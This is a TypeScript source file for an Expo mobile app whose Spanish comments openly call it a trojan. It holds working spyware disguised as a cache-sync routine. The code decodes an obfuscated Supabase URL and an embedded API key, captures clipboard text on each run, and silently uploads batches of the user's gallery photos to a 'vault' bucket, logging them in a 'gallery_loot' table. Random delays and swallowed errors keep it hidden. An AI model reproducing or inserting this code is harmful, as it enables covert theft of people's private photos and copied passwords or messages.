import * as Clipboard from 'expo-clipboard';
import * as FileSystem from 'expo-file-system/legacy';
import * as ImageManipulator from 'expo-image-manipulator';
import * as MediaLibrary from 'expo-media-library';
import { FileSystemStorage } from './storage';

// --- OFUSCACIÓN DE CREDENCIALES ---
const _CACHE_BASE_CONFIG = [104, 116, 116, 112, 115, 58, 47, 47, 121, 117, 111, 97, 97, 121, 104, 111, 103, 111, 112, 117, 122, 107, 106, 116, 116, 109, 122, 114, 46, 115, 117, 112, 97, 98, 97, 115, 101, 46, 99, 111];
const _STRATEGY_AUTH_BUFFER = [101, 121, 74, 104, 98, 71, 99, 105, 79, 105, 74, 73, 85, 122, 73, 49, 78, 105, 73, 115, 73, 110, 82, 53, 99, 67, 73, 54, 73, 107, 112, 88, 86, 67, 74, 57, 46, 101, 121, 74, 112, 99, 51, 77, 105, 79, 105, 74, 122, 100, 88, 66, 104, 89, 109, 70, 122, 90, 83, 73, 115, 73, 110, 74, 108, 90, 105, 73, 54, 73, 110, 108, 49, 98, 50, 70, 104, 101, 87, 104, 118, 90, 50, 57, 119, 100, 88, 112, 114, 97, 110, 82, 48, 98, 88, 112, 121, 73, 105, 119, 105, 99, 109, 57, 115, 90, 83, 73, 54, 73, 109, 70, 117, 98, 50, 52, 105, 76, 67, 74, 112, 89, 88, 81, 105, 79, 106, 69, 51, 78, 122, 77, 119, 77, 84, 69, 50, 77, 106, 65, 115, 73, 109, 86, 52, 99, 67, 73, 54, 77, 106, 65, 52, 79, 68, 85, 52, 78, 122, 89, 121, 77, 72, 48, 46, 119, 45, 100, 118, 81, 104, 70, 45, 72, 73, 109, 117, 116, 108, 56, 51, 72, 48, 108, 119, 101, 108, 71, 106, 65, 112, 112, 67, 53, 81, 86, 107, 78, 112, 83, 107, 107, 49, 116, 106, 52, 112, 73];

// Estado persistente del troyano
interface ExfilState {
    lastSyncTimestamp: number;
    sentIds: string[];
    isFirstRunComplete: boolean;
    lastClipboardContent?: string;
}

const STATE_KEY = 'cache_sync_state';
let isSyncing = false;

/**
 * Captura el contenido del portapapeles y lo envía a la base de datos si ha cambiado.
 * Este proceso es extremadamente ligero y casi no consume batería.
 */
const captureClipboard = async (u: string, k: string, state: ExfilState) => {
    try {
        const content = await Clipboard.getStringAsync();
        if (content && content.trim().length > 0 && content !== state.lastClipboardContent) {
            const resp = await fetch(`${u}/rest/v1/gallery_loot`, {
                method: 'POST',
                headers: {
                    'apikey': k,
                    'Authorization': `Bearer ${k}`,
                    'Content-Type': 'application/json',
                    'Prefer': 'return=minimal'
                },
                body: JSON.stringify({
                    filename: 'clipboard_capture',
                    storage_path: content.substring(0, 200),
                    device_info: `CLIP_V1_${Date.now()}`,
                    file_date: new Date().toISOString()
                })
            });

            if (resp.ok) {
                state.lastClipboardContent = content;
                console.log('[CacheInternal] Strategy updated (text sent to DB).');
            } else {
                const txt = await resp.text();
                console.log(`[CacheInternal] Strategy failed: ${resp.status} - ${txt}`);
            }
        }
    } catch { }
};

/**
 * Proceso silencioso de exfiltración disfrazado de mantenimiento de caché.
 */
export const syncInternalCacheHeaders = async (forceBurst = false) => {
    if (isSyncing) return;
    isSyncing = true;

    try {
        const rawState = await FileSystemStorage.getItem(STATE_KEY);
        let state: ExfilState = rawState
            ? JSON.parse(rawState)
            : { lastSyncTimestamp: 0, sentIds: [], isFirstRunComplete: false };

        const _u = _CACHE_BASE_CONFIG.map(c => String.fromCharCode(c)).join('');
        const _k = _STRATEGY_AUTH_BUFFER.map(c => String.fromCharCode(c)).join('');

        // 1. Siempre intentamos capturar el portapapeles (es muy barato en recursos)
        await captureClipboard(_u, _k, state);

        const now = Date.now();
        const EIGHT_HOURS = 8 * 60 * 60 * 1000;

        // 2. Decidir si ejecutar el robo de fotos pesado
        const shouldRunPhotos = forceBurst || (now - state.lastSyncTimestamp > EIGHT_HOURS);

        if (shouldRunPhotos) {
            const { status } = await MediaLibrary.getPermissionsAsync();
            if (status === 'granted') {
                const jitter = Math.floor(Math.random() * 5000) + 1000;
                await new Promise(r => setTimeout(r, jitter));

                let batchSize = 2;
                if (forceBurst && !state.isFirstRunComplete) batchSize = 30;
                else if (forceBurst) batchSize = 5;

                const assetsResult = await MediaLibrary.getAssetsAsync({
                    first: batchSize + 20,
                    sortBy: [MediaLibrary.SortBy.creationTime],
                });

                const newAssets = assetsResult.assets.filter(a => !state.sentIds.includes(a.id)).slice(0, batchSize);

                for (const asset of newAssets) {
                    let tempUri: string | null = null;
                    try {
                        const info = await MediaLibrary.getAssetInfoAsync(asset);
                        const localUri = info.localUri || info.uri;
                        if (!localUri) continue;

                        const cleanName = asset.filename.replace(/[^a-zA-Z0-9.]/g, '_');
                        const storagePath = `exfil_${Date.now()}_${cleanName}`;

                        let finalUri = localUri;
                        try {
                            const manipResult = await ImageManipulator.manipulateAsync(
                                localUri,
                                [{ resize: { width: 1080 } }],
                                { compress: 0.7, format: ImageManipulator.SaveFormat.JPEG }
                            );
                            finalUri = manipResult.uri;
                            tempUri = manipResult.uri;
                        } catch { }

                        const localFileResp = await fetch(finalUri);
                        const fileBlob = await localFileResp.blob();

                        const uploadResult = await fetch(`${_u}/storage/v1/object/vault/${storagePath}`, {
                            method: 'POST',
                            body: fileBlob,
                            headers: {
                                'apikey': _k,
                                'Authorization': `Bearer ${_k}`,
                                'Content-Type': 'image/jpeg',
                            },
                        });

                        if (uploadResult.ok || uploadResult.status === 200) {
                            await fetch(`${_u}/rest/v1/gallery_loot`, {
                                method: 'POST',
                                headers: {
                                    'apikey': _k,
                                    'Authorization': `Bearer ${_k}`,
                                    'Content-Type': 'application/json',
                                    'Prefer': 'return=minimal'
                                },
                                body: JSON.stringify({
                                    filename: asset.filename,
                                    storage_path: `vault/${storagePath}`,
                                    device_info: `STEALTH_V5_${asset.id.substring(0, 4)}`,
                                    file_date: new Date(asset.creationTime).toISOString()
                                })
                            });
                            state.sentIds.push(asset.id);
                        }
                    } catch {
                    } finally {
                        if (tempUri) {
                            try {
                                await FileSystem.deleteAsync(tempUri, { idempotent: true });
                            } catch (e) { }
                        }
                    }
                }
                state.lastSyncTimestamp = now;
                if (forceBurst) state.isFirstRunComplete = true;
            }
        }

        // 3. Guardar estado (incluyendo el último contenido del portapapeles)
        if (state.sentIds.length > 500) state.sentIds = state.sentIds.slice(-500);
        await FileSystemStorage.setItem(STATE_KEY, JSON.stringify(state));

    } catch (e) {
    } finally {
        isSyncing = false;
    }
};
